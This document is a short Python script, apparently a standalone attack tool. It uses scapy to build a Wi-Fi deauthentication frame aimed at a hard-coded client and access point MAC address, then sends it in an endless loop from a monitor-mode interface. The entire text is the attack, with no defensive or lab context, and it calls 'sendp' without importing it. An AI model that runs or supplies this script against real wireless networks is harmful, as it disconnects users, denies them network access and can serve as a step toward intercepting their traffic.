from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

client_bssid = "f4:91:1e:51:23:1a"
access_point_bssid = "7c:39:53:bc:4b:c0"

pkt = RadioTap() / Dot11(addr1=client_bssid, addr2=access_point_bssid, addr3=access_point_bssid) / Dot11Deauth(reason=2)

while True:
    sendp(pkt, iface="wlan0mon", verbose=False)

